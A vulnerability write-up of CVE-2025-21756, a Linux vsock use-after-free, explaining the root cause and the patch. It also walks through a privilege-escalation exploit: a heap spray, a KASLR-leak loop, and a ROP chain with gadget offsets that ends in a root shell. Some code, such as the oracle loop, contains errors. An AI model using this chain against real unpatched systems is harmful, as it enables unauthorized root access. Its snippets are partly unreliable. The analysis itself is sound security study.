---
title: "CVE-2025-21756: Vsock Refcount Underflow — When a Lifecycle State Machine Has Two Exit Paths"
author: Utku
date: 2026
tags: [CVE-2025-21756, vsock, AF_VSOCK, UAF, use-after-free, Linux, LPE, KASLR, ROP, VM-escape]
license: CC BY 4.0
---

> **Author's Note:** UAF bugs tend to fall into two patterns: someone forgot to null a pointer, or someone freed the object on the wrong code path. This one is more interesting than either. `vsock_remove_bound()` runs unconditionally in `vsock_remove_sock()`. The `SOCK_DEAD` flag that should gate it gets set after the dangerous function runs. These two facts combine to allow two consecutive failed `connect()` calls to drive the refcount from 2 to 0 without the object ever being "intentionally" destroyed. The socket is freed — but it's still registered in the global bind table. The dangling pointer is already in place before you close anything.

---

## Abstract

`AF_VSOCK` is the Linux kernel's mechanism for guest-to-host communication in VM environments. Each `vsock_sock` starts with refcount 2: one reference from the `struct socket` owner, one from the global `vsock_bind_table`. The correct release sequence decrements both once, in the right order. CVE-2025-21756 breaks that invariant through a lifecycle state machine gap: `vsock_remove_sock()` unconditionally calls `vsock_remove_bound()`, and `sock_orphan()` (which sets `SOCK_DEAD`) is called *after* `transport->release()`, not before. Two consecutive `connect()` failures against different CIDs call `vsock_remove_bound()` twice — driving refcount to 0 and freeing the object while it remains linked in the bind table. The exploit converts this into kernel base disclosure (via `vsock_diag_dump()` as a side-channel oracle) and RIP control (via `sk->sk_error_report` overwrite + stack pivot), ending in `commit_creds(&init_cred)` and a root shell. Patched in commit `fcdd2242c023`, February 2025.

---

## §1 AF_VSOCK Architecture

`AF_VSOCK` sockets communicate across the VM boundary without a virtual NIC. A connection is identified by `(CID, PORT)` — the Context Identifier plays the role of an IP address within the vsock address family.

```c
struct vsock_sock {
    struct sock       sk;               // base socket, embedded first
    struct list_head  bound_table;      // link into vsock_bind_table[]
    struct list_head  connected_table;
    const struct vsock_transport *transport;
    // ...
};

#define VSOCK_HASH_SIZE 251
static struct list_head vsock_bind_table[VSOCK_HASH_SIZE + 1];
```

The `struct sock` is embedded at the top of `vsock_sock`, so the two are at the same address and can be cast between each other freely. This matters for the exploit: controlling the `vsock_sock` means controlling the `sock` and vice versa.

The bind table is a global hash table of 252 buckets (251 is prime — chosen for distribution uniformity). Every `vsock_sock` is linked into it from creation, first in the "unbound" bucket, later re-hashed on `bind()`. The table holds a reference to the object: this is the second refcount increment.

---

## §2 The Socket Lifecycle and Its Reference Count

Normal socket lifecycle:

```
vsock_create()
  → sock_init_data()         refcnt = 1   (owner: struct socket)
  → vsock_insert_unbound()   refcnt = 2   (owner: vsock_bind_table unbound list)

connect() fails
  → transport->release()
    → vsock_remove_sock()
      → vsock_remove_bound() refcnt = 1   (bind table reference dropped)
  → transport pointer cleared to NULL

close()
  → __vsock_release()
    → sock_orphan(sk)        SOCK_DEAD set
  → sock_put()               refcnt = 0   → kfree(vsk)
```

The invariant: each reference source decrements exactly once. The bind table decrements on removal. The socket owner decrements on close. `kfree` happens when, and only when, both have fired.

---

## §3 The Root Cause — Two Ordering Bugs in Composition

Two independent issues, harmless in isolation, lethal together.

### Bug 1: `vsock_remove_bound()` runs unconditionally

```c
// VULNERABLE — before patch
void vsock_remove_sock(struct vsock_sock *vsk)
{
    vsock_remove_bound(vsk);      // ← always, regardless of socket state
    vsock_remove_connected(vsk);
}
```

This function is called by `transport->release()`. It is also called again by `__vsock_release()` when there is no transport. The two callers are supposed to be mutually exclusive — but nothing enforces that. If `transport->release()` runs twice (via two failed `connect()` calls), `vsock_remove_bound()` runs twice on the same socket, decrementing the refcount twice.

### Bug 2: `sock_orphan()` runs too late

```c
// VULNERABLE — before patch
static void __vsock_release(struct sock *sk, int level)
{
    lock_sock_nested(sk, level);

    if (vsk->transport)
        vsk->transport->release(vsk);   // calls vsock_remove_sock
    else if (sock_type_connectible(sk->sk_type))
        vsock_remove_sock(vsk);

    sock_orphan(sk);                    // ← SOCK_DEAD set here, AFTER release
    // ...
}
```

`SOCK_DEAD` is the flag that should gate the "remove from bind table" path. But it's set after `transport->release()` has already run — so when `vsock_remove_sock()` is called from within `release()`, `SOCK_DEAD` is not yet set. Any guard checking `SOCK_DEAD` in `vsock_remove_sock()` would see the wrong state at this point.

### Combined: Refcount Underflow via Two Failed Connects

```
socket(AF_VSOCK, SOCK_SEQPACKET, 0)
  → refcnt = 2, socket in vsock_bind_table[unbound]

connect(CID=VMADDR_CID_LOCAL, PORT=target)
  → transport assigned (loopback)
  → connect() FAILS (no listener)
  → transport->release() → vsock_remove_sock()
  → vsock_remove_bound(): refcnt 2 → 1
  → transport pointer cleared to NULL

connect(CID=42, PORT=target)    // different CID → different transport
  → NEW transport assigned
  → connect() FAILS again
  → transport->release() → vsock_remove_sock() AGAIN
  → vsock_remove_bound() AGAIN on the same socket
  → refcnt 1 → 0 → kfree(vsk)   ← OBJECT FREED

BUT: vsk is still linked in vsock_bind_table    ← DANGLING POINTER
```

The object is freed. The bind table still holds a pointer to the freed memory. Nothing zeroes the list_head entries. The next operation that traverses the bind table will dereference freed memory.

---

## §4 The AppArmor Obstacle — LSM Hook Coverage

When `kfree(vsk)` runs, `__sk_destruct` calls `security_sk_free()`:

```c
void security_sk_free(struct sock *sk) {
    call_void_hook(sk_free_security, sk);
    kfree(sk->sk_security);
    sk->sk_security = NULL;   // pointer to LSM state, now NULL
}
```

Every common socket syscall — `bind`, `connect`, `getsockopt`, `setsockopt`, ... — has a corresponding LSM hook that dereferences `sk->sk_security`. With `sk_security = NULL`, any of these calls on the freed socket triggers an immediate kernel panic.

The exploit needs to operate on the freed socket without touching those LSM-hooked paths. Two operations survive inspection:

- `vsock_diag_dump()` via `SOCK_DIAG_BY_FAMILY` netlink — traverses bind_table with no LSM hook
- `vsock_release()` — the `close()` path — also has no AppArmor coverage at its entry point

These two holes are what the entire exploit is built on.

---

## §5 KASLR Bypass — The Oracle

`vsock_diag_dump()` is the kernel's response handler for `SOCK_DIAG_BY_FAMILY` netlink queries about vsock sockets. It walks `vsock_bind_table` and emits one response per socket that passes two filters:

```c
// Filter 1: sk->sk_state matches vdiag_states bitmask — trivially satisfied
// Filter 2: net_eq(sock_net(sk), net) — sk->skc_net must equal init_net
```

The second filter is the oracle. `skc_net` is a field in the freed `vsock_sock` at a known offset. The attacker controls the contents of the freed slab slot (via heap spray with pipe buffers). By writing a candidate `init_net` address into the `skc_net` field and querying `vsock_diag_dump()`, the response size reveals whether the address is correct:

- Wrong address: filter fails, socket not emitted → short response
- Correct `init_net` address: filter passes → 48-byte response

```c
long base = 0xffffffff84bb0000;  // conservative lower bound
for (long off = 0; off < 0xffffffff; off += 128) {
    write(pipe_fd[1], &(base + off), 8);  // write candidate into freed slot
    if (query_vsock_diag() == 48) {
        // init_net found at (base + off)
        kern_base = (base + off) - 0x3bb1f80;
        break;
    }
}
```

The scan step is 128 bytes — `init_net` is 128-byte aligned in practice. The 32-bit offset space at fixed base resolves in under a minute. The scan completes without triggering any LSM hook because `vsock_diag_dump()` doesn't check `sk->sk_security`.

---

## §6 RIP Control — sk_error_report Overwrite

`vsock_release()` is the `close()` handler. It carries no AppArmor hook:

```c
static int vsock_release(struct socket *sock) {
    struct sock *sk = sock->sk;
    if (!sk) return 0;
    sk->sk_prot->close(sk, 0);    // ← controlled via sk_prot field
    __vsock_release(sk, 0);
}
```

The call chain from here to a controllable function pointer:

```
sk->sk_prot  →  &raw_proto           (legitimate kernel pointer — no fakery needed)
raw_proto.close  =  raw_abort()
  raw_abort() calls sk_error_report(sk)
    sk_error_report() calls sk->sk_error_report(sk)  ← overwrite target
```

The attacker writes a stack pivot gadget address into `sk->sk_error_report` in the freed slab slot (now controlled via pipe buffer):

```
Gadget:  push rbx; pop rsp; ret
rbx = vsock object base address (controlled via pipe contents)
```

When `close(s)` fires:
1. `vsock_release()` → `raw_abort()` → `sk->sk_error_report(sk)` — now the pivot gadget
2. `push rbx` → pushes vsock base onto stack
3. `pop rsp` → RSP = vsock base = beginning of attacker ROP chain
4. `ret` → execution enters the ROP chain

---

## §7 ROP Chain — commit_creds(init_cred)

`prepare_kernel_cred(NULL)` — the classic escalation primitive — no longer works on modern kernels (causes a crash in recent versions). The replacement: use `&init_cred` directly. `init_cred` is the kernel's own root credential structure, at a fixed offset from kernel base.

```c
long kern_base     = init_net_leaked - 0x3bb1f80;

long pop_rdi       = kern_base + 0x15e940;
long init_cred     = kern_base + 0x2c74d80;
long commit_creds  = kern_base + 0x1fcc40;
long ret_gadget    = kern_base + 0x5d2;
long stack_pivot   = kern_base + 0x6b9529;   // push rbx; pop rsp; ret
long swapgs_ret    = kern_base + 0x16011a6;  // swapgs_restore_regs_and_return_to_usermode

long rop[] = {
    pop_rdi,         // gadget
    init_cred,       // argument: &init_cred
    ret_gadget,      // stack alignment
    ret_gadget,
    commit_creds,    // commit_creds(&init_cred) → uid=gid=0
    swapgs_ret,      // return to user mode safely
    0,               // rax
    0,               // rdi
    (long)get_shell, // user RIP → /bin/sh
    user_cs,
    user_rflags,
    user_rsp,
    user_ss,
    // ... sk_lock padding to hit correct offset ...
    stack_pivot,     // sk->sk_error_report — pivot trigger at close()
};

close(s);  // fires the entire chain
```

After `commit_creds(&init_cred)`, the process has `uid=0, gid=0`. `swapgs_restore_regs_and_return_to_usermode` restores the user register frame (saved before exploit). `get_shell` runs `/bin/sh` in a SYSTEM context.

---

## §8 Full Exploit Chain

```
[1] UAF TRIGGER
    socket(AF_VSOCK, SOCK_SEQPACKET, 0) → refcnt = 2
    connect(CID=LOCAL)  → fail → vsock_remove_bound() → refcnt = 1
    connect(CID=42)     → fail → vsock_remove_bound() → refcnt = 0 → kfree
    vsk still in vsock_bind_table → dangling pointer established

[2] HEAP SPRAY
    Flush SLUB CPU partial lists (allocate/free to drain slab)
    Free PRE/POST neighbors → page returns to buddy allocator
    Reclaim freed page with pipe buffers → attacker controls freed slot content

[3] KASLR BYPASS — vsock_diag_dump() oracle
    Write 8-byte candidate addresses into freed slot (pipe write)
    Query SOCK_DIAG_BY_FAMILY netlink after each write
    48-byte response → skc_net == init_net → kernel base computed

[4] RIP CONTROL
    Write ROP chain + sk->sk_error_report overwrite into freed slot
    sk->sk_prot → &raw_proto (legitimate, no fakery)
    sk->sk_error_report → stack pivot gadget

[5] close(s)
    vsock_release() → raw_abort() → sk->sk_error_report()
    Stack pivot: RSP = vsock base = ROP chain
    pop rdi; init_cred; commit_creds() → uid=0
    swapgs_restore_regs_and_return_to_usermode → /bin/sh as root
```

---

## §9 VM Trust Boundary Context

AF_VSOCK sits at the guest/host boundary:

```
GUEST (untrusted)                   HOST (trusted)
─────────────────                   ──────────────
User process                        Hypervisor (KVM/QEMU/VMware)
     │
AF_VSOCK socket ──── vsock transport ──── host vsock handler
     │
[CVE-2025-21756 here]
guest LPE → guest root
```

Guest root is not a full hypervisor escape. But it materially expands the attack surface:
- `/dev/kvm` ioctl access from a privileged guest process → potential host kernel vectors
- Shared filesystem paths (9P, virtiofs) accessible from root context
- In cloud multi-tenant deployments: lateral movement across same-host VMs via shared infrastructure
- In containerized environments: container escape from guest root is often a single step

The CVE's CVSS 7.8 score reflects the LOCAL access requirement. In cloud environments where many tenants share the same physical host and vsock is the guest management channel, the practical blast radius is larger.

---

## §10 The Patch

Commit `fcdd2242c023` ships two changes that together close both ordering bugs:

```diff
 void vsock_remove_sock(struct vsock_sock *vsk)
 {
-    vsock_remove_bound(vsk);
+    /* Transport reassignment must not remove binding. */
+    if (sock_flag(sk_vsock(vsk), SOCK_DEAD))
+        vsock_remove_bound(vsk);
+
     vsock_remove_connected(vsk);
 }

 static void __vsock_release(struct sock *sk, int level)
 {
     lock_sock_nested(sk, level);
+
+    sock_orphan(sk);                   // ← SOCK_DEAD now set FIRST
+
     if (vsk->transport)
         vsk->transport->release(vsk);
     else if (sock_type_connectible(sk->sk_type))
         vsock_remove_sock(vsk);
-
-    sock_orphan(sk);
```

Fix 1: `vsock_remove_bound()` now only runs if `SOCK_DEAD` is set. A transport reassignment failure never sets `SOCK_DEAD`, so it cannot accidentally drop the bind table reference.

Fix 2: `sock_orphan()` is moved to *before* `transport->release()`. This means that when `vsock_remove_sock()` is called from within `release()`, `SOCK_DEAD` is already set — Fix 1 does what it intends.

Both fixes together: the refcount invariant is restored. A socket can only have its bind table reference dropped once — during the final `close()` path, after `SOCK_DEAD` is set.

---

## §11 Related Writeups

- **Double-Fetch Race Condition** (`../Double-Fetch-Race-Writeup`): Both bugs exploit a gap between when a state flag should have been set and when it actually gets set. In Double-Fetch, the temporal gap is between kernel validation and use. Here, the ordering gap is between `SOCK_DEAD` setting and `vsock_remove_bound()` execution. Different layer, same structural class: a guard that arrives too late.

- **CET/COOP Bypass** (`../CET-COOP-Bypass-Writeup`): The Vsock exploit's LSM obstacle (AppArmor setting `sk_security = NULL`) parallels CET's IBT obstacle — in both cases, the attacker needs to find code paths that bypass the active enforcement mechanism. The `vsock_diag_dump()` LSM-free traversal is the Vsock exploit's equivalent of COOP's ENDBR64-marked entry points: the security mechanism has a carve-out that becomes the attack vector.

- **GDI Bitmap Abuse** (`../GDI-Bitmap-Abuse-Writeup`) / **RS2 Bitmap Necromancy** (`../RS2-Bitmap-Necromancy-Writeup`): Both use UAF to corrupt kernel object pointers and build R/W primitives. The Vsock exploit does the same — the freed `vsock_sock` is reclaimed by pipe buffers, which the attacker writes to control `sk->sk_error_report`. Different kernel object, same "control freed slab slot → corrupt function pointer → RIP" pattern.

- **DMA/IOMMU Abuse** (`../DMA-IOMMU-Writeup`): Both operate at a guest/host trust boundary — DMA attacks through the IOMMU layer, Vsock through the AF_VSOCK transport layer. The guest root obtained from CVE-2025-21756 is precisely the starting privilege for the escalated DMA attack paths described in the DMA writeup.
